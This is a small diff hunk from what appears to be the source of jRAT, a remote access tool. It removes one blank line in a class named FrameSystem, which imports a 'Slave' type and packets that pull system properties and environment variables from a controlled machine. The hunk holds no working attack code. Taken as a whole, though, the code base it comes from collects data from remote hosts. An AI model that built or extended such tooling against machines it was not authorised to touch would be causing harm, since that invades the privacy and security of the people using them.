@@ -28,7 +28,6 @@ import pro.jrat.Slave;
 import pro.jrat.packets.outgoing.Packet90SystemProperties;
 import pro.jrat.packets.outgoing.Packet96EnvironmentVariables;
 
-
 @SuppressWarnings("serial")
 public class FrameSystem extends BaseFrame {
 
